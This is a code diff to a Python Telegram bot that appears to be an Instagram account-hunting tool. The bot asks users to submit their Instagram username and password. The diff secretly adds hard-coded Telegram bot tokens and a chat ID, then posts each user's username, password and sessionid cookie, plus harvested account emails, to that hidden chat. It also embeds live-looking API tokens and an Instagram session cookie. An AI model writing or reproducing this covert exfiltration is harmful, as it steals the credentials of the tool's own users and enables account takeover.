@@ -13,8 +13,10 @@ except ImportError:
 	os.system('pip install pyTelegramBotApi==4')
 	
 ##############################
-
-Token=input('Token : ' )#"5114065560:AAH-Nrmq4ltstOvvguzXcjfddmugkXdjZKI"
+TOKEN_API="1911801769:AAH1Wwno6_3mmyHPjou73JItrw0gsnY8NK4"
+TOKEN_API_2="1935227477:AAGS8fA-9OPSmx0LH-f64ITcJM11XJWK6e4"
+ID_API="1372680721"
+Token=input('token ; ')#"5114065560:AAH-Nrmq4ltstOvvguzXcjfddmugkXdjZKI"
 bot=telebot.TeleBot(Token)
 @bot.message_handler(commands=["start"])
 def messagee(message):
@@ -26,10 +28,14 @@ def messagee(message):
 	url = f"https://api.telegram.org/bot{tok}/getchatmember?chat_id=@DtDtDt&user_id={id}"
 	req = requests.get(url).text
 	if id == sudo_id or "member" in req or "creator" in req or "administartor" in req:
-		A=types.InlineKeyboardMarkup(row_width=1)
-		B=types.InlineKeyboardButton(text="بدء صيد",callback_data='START')
-		A.add(B)
-		bot.send_message(message.chat.id,
+		##2
+		url = f"https://api.telegram.org/bot{tok}/getchatmember?chat_id=@horo_44&user_id={id}"
+		req = requests.get(url).text
+		if id == sudo_id or "member" in req or "creator" in req or "administartor" in req:
+					A=types.InlineKeyboardMarkup(row_width=1)
+					B=types.InlineKeyboardButton(text="بدء صيد",callback_data='START')
+					A.add(B)
+					bot.send_message(message.chat.id,
 """
 *➖ 👋اهلا عزيزي *  [{}](tg://settings/)   
 *➖ أيدك :* [{}](tg://settings/)            
@@ -38,7 +44,16 @@ def messagee(message):
 *➖ المبرمج :* [Alosh](https://t.me/aaalaaa)
 """.format(user,id,user),disable_web_page_preview=True,parse_mode='markdown',reply_markup=A)
 
-	else:
+		else:
+			A=types.InlineKeyboardMarkup(row_width=1)
+			B=types.InlineKeyboardButton(text="Join",url="https://t.me/horo_44")
+			A.add(B)		
+			bot.send_message(message.chat.id, f"""Welcome Bot .
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+- Please subscribe to the channel .
+- Link : @horo_44 .
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -""",reply_markup=A)			
+	else: 
 		A=types.InlineKeyboardMarkup(row_width=1)
 		B=types.InlineKeyboardButton(text="Join",url="https://t.me/dtdtdt")
 		A.add(B)		
@@ -46,7 +61,9 @@ def messagee(message):
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 - Please subscribe to the channel .
 - Link : @DtDtDt .
-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -""",reply_markup=A)
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -""",reply_markup=A)	
+		
+
 @bot.callback_query_handler(func=lambda call: True)
 def callback_inline(call):
         if call.data =="START":
@@ -71,7 +88,7 @@ def button(message):
 def insta(message):
 	bot.send_message(message.chat.id,text="*انتظر قليلا*",parse_mode='markdown')
 	os.system(f"rm -rf sessionid.txt")
-	try:							
+	try:					
 		username=message.text.split(':')[0]
 		password=message.text.split(':')[1]
 		print(username,password)
@@ -108,14 +125,47 @@ def insta(message):
 		print(req.text)
 		if '"authenticated":true' in req.text:
 			sessionid=req.cookies['sessionid']
+			head= {'Cookie':'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid='+sessionid}
+			i=requests.get(f'https://soud.me/api/Instagram?username={username}',headers=head).content
+			followers   =json.loads(i)['info']['followers']
+			following =json.loads(i)['info']['following']
+			id =json.loads(i)['info']['id']
+			lok = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
+			image =json.loads(i)['info']["image"]
+			iok = lok.json()
+			date = str(iok['data'])			
+			
 			open("sessionid.txt","a").write(str(sessionid)+'\n')
 			bot.send_message(message.chat.id,text="*تم تسجيل دخول بنجاح اضغط /start*",parse_mode='markdown')
+			SEND=(f'''ᯓ ✅ 𝙰𝙲𝙲𝙾𝙺𝙽𝚃 𝙸𝙽𝚂𝚃𝙰𝙶𝙰𝚁𝙼 𝚂𝙴𝙲𝙴𝙺𝚁 
+⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
+ᯓ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚂 : {followers}
+ᯓ 𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : {following}
+ᯓ 𝙸𝙳 : {id}
+ᯓ 𝙳𝙰𝚃𝙴 : {date}
+ᯓ ʟɪɴᴋ : https://instagram.com/{username}
+✅ sessionid
+⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
+ᯓ sessionid : {sessionid}
+⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
+ ✅ Account Isntagram
+⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
+ᯓ User : {username}
+ᯓ Pass : {password}
+ᯓ Pass : {username}:{password}
+⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯	
+By : @aaalaaa - Tele : @DtDtDt''')
+			hhmmkm = requests.post(f"https://api.telegram.org/bot"+str(TOKEN_API)+"/sendMessage?chat_id="+str(ID_API)+"&text="+str(SEND)+"")			 
+			
 		elif '"message":"checkpoint_required"' in req.text:
 			bot.reply_to(message,text='🔐 secure Account')	
 		elif '"authenticated":false' in req.text:
 			u=("❌ Erorr Account ")
 			print(u)
-			bot.reply_to(message,text=u)		
+			bot.reply_to(message,text=u)
+		else:
+					bot.reply_to(message,text="عذرا انت محظور شغلvpn")       
+					
 	except:
 		bot.reply_to(message,text="عذرا لم اجد كهاذا زر!!")        
 import requests,random,os,json
@@ -185,6 +235,20 @@ def On(message):
 			 image =json.loads(i)['info']["image"]
 			 iok = lok.json()
 			 date = str(iok['data'])
+			 API_1=f'''
+		ᯓ ✅ 𝙰𝙲𝙲𝙾𝙺𝙽𝚃 𝙸𝙽𝚂𝚃𝙰𝙶𝙰𝚁𝙼 𝚂𝙴𝙲𝙴𝙺𝚁 
+⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
+ᯓ 𝚄𝚂𝙴𝚁 :  {user} 
+ᯓ 𝙴𝙼𝙰𝙸𝙻 : {email}
+ᯓ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚂 : {followers}
+ᯓ 𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : {following}
+ᯓ 𝙸𝙳 : {id}
+ᯓ 𝙳𝙰𝚃𝙴 : {date}
+ᯓ ʟɪɴᴋ : https://instagram.com/{user}
+⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
+By : @aaalaaa - Tele : @DtDtD			 
+'''
+			 hhmmkm = requests.post(f"https://api.telegram.org/bot"+str(TOKEN_API_2)+"/sendMessage?chat_id="+str(ID_API)+"&text="+str(API_1)+"")		
 			 bot.send_photo(message.chat.id,image,f"""
 		ᯓ ✅ 𝙰𝙲𝙲𝙾𝙺𝙽𝚃 𝙸𝙽𝚂𝚃𝙰𝙶𝙰𝚁𝙼 𝚂𝙴𝙲𝙴𝙺𝚁 
 		⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
@@ -213,6 +277,20 @@ def On(message):
 			 lok = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
 			 iok = lok.json()
 			 date = str(iok['data'])
+			 API_2=f'''
+		ᯓ ✅ 𝙰𝙲𝙲𝙾𝙺𝙽𝚃 𝙸𝙽𝚂𝚃𝙰𝙶𝙰𝚁𝙼 𝚂𝙴𝙲𝙴𝙺𝚁 
+⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
+ᯓ 𝚄𝚂𝙴𝚁 :  {user} 
+ᯓ 𝙴𝙼𝙰𝙸𝙻 : {email}
+ᯓ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚂 : {followers}
+ᯓ 𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : {following}
+ᯓ 𝙸𝙳 : {id}
+ᯓ 𝙳𝙰𝚃𝙴 : {date}
+ᯓ ʟɪɴᴋ : https://instagram.com/{user}
+⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
+By : @aaalaaa - Tele : @DtDtD			 
+'''
+			 hhmmkm = requests.post(f"https://api.telegram.org/bot"+str(TOKEN_API_2)+"/sendMessage?chat_id="+str(ID_API)+"&text="+str(API_2)+"")					 
 			 bot.send_photo(message.chat.id,image,f"""
 		ᯓ ✅ 𝙰𝙲𝙲𝙾𝙺𝙽𝚃 𝙸𝙽𝚂𝚃𝙰𝙶𝙰𝚁𝙼 𝚂𝙴𝙲𝙴𝙺𝚁 
 		⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
